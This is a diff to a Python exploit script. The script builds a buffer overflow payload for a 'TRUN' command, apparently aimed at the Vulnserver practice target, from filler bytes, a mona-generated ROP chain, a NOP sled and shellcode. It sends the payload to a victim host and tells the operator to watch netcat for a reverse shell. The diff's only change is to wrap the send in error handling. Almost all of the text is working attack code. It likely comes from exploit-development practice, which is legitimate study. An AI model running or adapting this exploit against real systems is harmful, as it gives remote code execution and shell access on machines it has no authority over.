@@ -81,7 +81,6 @@ def create_rop_chain():
 
 rop_chain = create_rop_chain()
 
-
 payload  = "A" * 2003 # fill up the buffer after calculating the offset
 payload += rop_chain # generated with mona !mona rop -m *.dll -cp nonull
 payload += "\x90" * 16 # nopsled to ensure the shellcode executes
@@ -90,12 +89,15 @@ payload += "C" * (3000 - 2006 - len(rop_chain) - 16 - len(shellcode))
 
 buffer_exploit = "TRUN /.:/" + payload
 
-expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-expl.connect((victim_host, port))
-expl.send(buffer_exploit)
-print("[x] Sent TRUN + malicious payload to the victim")
-print("[x] Sending ROP chain")
-print("[x] Sending shellcode to victim system")
-print("[x] Watch nc for a reverse shell")
-print("[!] You may need to send it multiple times")
-expl.close()
+try:
+	expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	expl.connect((victim_host, port))
+	expl.send(buffer_exploit)
+	print("[x] Sent TRUN + malicious payload to the victim")
+	print("[x] Sending ROP chain")
+	print("[x] Sending shellcode to victim system")
+	print("[x] Watch nc for a reverse shell")
+	print("[!] You may need to send it multiple times")
+	expl.close()
+except:
+	print("[!] Error connecting to victim, exploit failed")
